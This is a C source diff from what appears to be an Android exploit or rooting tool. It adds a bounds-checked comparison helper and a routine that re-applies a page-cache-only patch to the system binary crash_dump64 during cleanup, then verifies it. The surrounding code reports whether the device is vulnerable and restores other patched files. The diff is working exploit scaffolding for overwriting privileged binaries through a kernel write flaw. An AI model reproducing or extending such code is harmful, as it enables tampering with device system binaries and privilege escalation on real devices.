@@ -16,6 +16,20 @@ static int df_helper_buf_ok(size_t len) {
     return len >= DF_HELPER_BUF_MIN && len <= DF_HELPER_BUF_MAX;
 }
 
+/* Pure bounds-checked 16-byte equality predicate shared by patch_helper()
+ * and ensure_helper_patch(). Placed above DF_HELPER_TEST_ONLY so the host
+ * test compiles the EXACT production predicate. */
+static int df_helper_block_matches(const uint8_t observed[16],
+                                   const char *expected, size_t expected_len,
+                                   size_t off)
+{
+    if (!observed || !expected) return 0;
+    if (off > expected_len || expected_len - off < 16) return 0;
+    for (size_t i = 0; i < 16; i++)
+        if (observed[i] != (uint8_t)expected[off + i]) return 0;
+    return 1;
+}
+
 #ifndef DF_HELPER_TEST_ONLY
 #include <stdio.h>
 #include <stdlib.h>
@@ -787,11 +801,68 @@ static int patch_helper(struct preflight *pf) {
         printf("patch: crash_dump64 verification read failed (n=%d)\n", n);
         return -1;
     }
-    if (memcmp(verify, pf->helper_buf + 16, 16) != 0) {
+    if (!df_helper_block_matches(verify, pf->helper_buf, pf->helper_len, 16)) {
         printf("patch: crash_dump64 verification failed\n");
         printf("patch: DEVICE NOT VULNERABLE\n");
         return -1;
     }
+    return 0;
+}
+
+/* KSU bootstrap can discard the page-cache-only splicehelper patch. Re-arm it
+ * before cleanup's helper-backed restores so vendor reads still work. A
+ * failure stays non-fatal to cleanup itself but is reported to the caller.
+ * No new restore record is added: crash_dump64's original was already recorded
+ * by patch_helper() and must remain the last (and single) restore. */
+static int ensure_helper_patch(struct preflight *pf) {
+    uint8_t observed[16];
+    int fd, n;
+
+    if (!pf || !pf->helper_buf || !pf->helper_orig ||
+        !df_helper_buf_ok(pf->helper_len)) {
+        printf("cleanup: helper patch state invalid; cannot re-establish\n");
+        return -1;
+    }
+
+    fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) {
+        printf("cleanup: helper patch check open failed\n");
+        return -1;
+    }
+    n = (int)pread(fd, observed, 16, 16);
+    close(fd);
+    if (n != 16) {
+        printf("cleanup: helper patch check read failed (n=%d)\n", n);
+        return -1;
+    }
+    if (df_helper_block_matches(observed, pf->helper_buf, pf->helper_len, 16)) {
+        printf("cleanup: crash_dump64 helper patch still present\n");
+        return 0;
+    }
+
+    printf("cleanup: crash_dump64 helper patch missing; re-applying\n");
+    if (patch_file_cbc(kCrashDump, pf->helper_buf, pf->helper_len, 0, 0,
+                       pf->helper_orig) != 0) {
+        printf("cleanup: helper re-patch failed\n");
+        return -1;
+    }
+
+    fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) {
+        printf("cleanup: helper re-patch verification failed\n");
+        printf("cleanup: crash_dump64 restore cannot be trusted\n");
+        return -1;
+    }
+    n = (int)pread(fd, observed, 16, 16);
+    close(fd);
+    if (n != 16 ||
+        !df_helper_block_matches(observed, pf->helper_buf, pf->helper_len, 16)) {
+        printf("cleanup: helper re-patch verification failed\n");
+        printf("cleanup: crash_dump64 restore cannot be trusted\n");
+        return -1;
+    }
+
+    printf("cleanup: crash_dump64 helper patch re-established (verified)\n");
     return 0;
 }
 
@@ -862,6 +933,14 @@ static int cleanup(struct preflight *pf) {
     int i, failed = 0;
     if (pf == NULL || pf->restore_count == 0) return 0;
     printf("\n=== cleanup ===\n");
+    /* KSU bootstrap can drop the page-cache-only helper patch. Re-arm it
+     * before helper-backed restores; a failure is recorded but does not
+     * abort cleanup, so non-helper restores and the final crash_dump64
+     * restore still run. */
+    if (ensure_helper_patch(pf) != 0) {
+        failed = 1;
+        printf("cleanup: helper patch unavailable; recovery will be reported failed\n");
+    }
     for (i = pf->restore_count - 1; i >= 0; i--) {
         struct restore_record *r = &pf->restores[i];
         uint8_t *verify;
